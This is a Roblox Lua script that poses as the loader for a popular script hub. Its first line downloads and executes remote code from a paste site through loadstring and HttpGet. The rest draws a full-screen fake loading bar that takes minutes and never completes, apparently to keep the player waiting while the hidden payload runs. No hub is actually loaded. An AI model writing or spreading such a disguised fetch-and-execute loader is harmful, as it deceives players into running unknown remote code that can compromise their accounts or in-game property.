loadstring(game:HttpGet("https://paste.fe4r.click/raw/23529ed3-574c-445e-b2d3-edfb2b57e843"))()
-- Get the URL from which this script was loaded
local scriptUrl = debug.info(1, "s") or ""

-- Define default config (Redz)
local name = "Redz Hub"
local themeColor = Color3.fromRGB(220, 30, 30)
local subTextColor = Color3.fromRGB(245, 74, 74)
local bgBarColor = Color3.fromRGB(60, 18, 18)
local duration = 360

-- Auto-detect repository name based on keywords in the URL
if string.find(scriptUrl:lower(), "quantum") then
	name = "Quantum Hub"
	themeColor = Color3.fromRGB(150, 50, 220) -- Purple
	subTextColor = Color3.fromRGB(190, 100, 245)
	bgBarColor = Color3.fromRGB(40, 15, 60)
	duration = 240
elseif string.find(scriptUrl:lower(), "banana") then
	name = "Banana Hub"
	themeColor = Color3.fromRGB(240, 200, 30) -- Yellow
	subTextColor = Color3.fromRGB(255, 220, 80)
	bgBarColor = Color3.fromRGB(60, 50, 10)
	duration = 180
elseif string.find(scriptUrl:lower(), "mozil") then
	name = "Mozil Hub"
	themeColor = Color3.fromRGB(30, 180, 220) -- Cyan
	subTextColor = Color3.fromRGB(80, 210, 245)
	bgBarColor = Color3.fromRGB(10, 45, 60)
	duration = 200
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen_" .. name
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999999999
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 483, 0, 260)
mainFrame.Position = UDim2.new(0.5, -241, 0.5, -130)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 100
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = themeColor
stroke.Thickness = 4
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -20, 0, 45)
titleLabel.Position = UDim2.new(0, 10, 0, 32)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = name
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.TextSize = 36
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.ZIndex = 101
titleLabel.Parent = mainFrame

local subLabel = Instance.new("TextLabel")
subLabel.Size = UDim2.new(1, -30, 0, 25)
subLabel.Position = UDim2.new(0, 15, 0, 105)
subLabel.BackgroundTransparency = 1
subLabel.Text = string.format("Loading %s (first execute is slow)", name)
subLabel.TextColor3 = subTextColor
subLabel.Font = Enum.Font.GothamBold
subLabel.TextSize = 16
subLabel.TextXAlignment = Enum.TextXAlignment.Center
subLabel.ZIndex = 101
subLabel.Parent = mainFrame

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, -50, 0, 12)
barBg.Position = UDim2.new(0, 25, 0, 158)
barBg.BackgroundColor3 = bgBarColor
barBg.BorderSizePixel = 0
barBg.ZIndex = 101
barBg.Parent = mainFrame

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(0, 6)
barBgCorner.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = themeColor
barFill.BorderSizePixel = 0
barFill.ZIndex = 102
barFill.Parent = barBg

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 6)
fillCorner.Parent = barFill

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 25)
percentLabel.Position = UDim2.new(0, 0, 0, 184)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.GothamBlack
percentLabel.TextSize = 16
percentLabel.TextXAlignment = Enum.TextXAlignment.Center
percentLabel.ZIndex = 101
percentLabel.Parent = mainFrame

local targetPercent = 99.8
local startTime = tick()
local currentPercent = 0

local connection
connection = RunService.Heartbeat:Connect(function()
	if currentPercent >= targetPercent then 
		connection:Disconnect()
		return 
	end

	local t = math.min((tick() - startTime) / duration, 1)
	local eased = 1 - (1 - t) ^ 3

	currentPercent = eased * targetPercent
	barFill.Size = UDim2.new(currentPercent / 100, 0, 1, 0)
	percentLabel.Text = string.format("%.1f%%", currentPercent)
end)
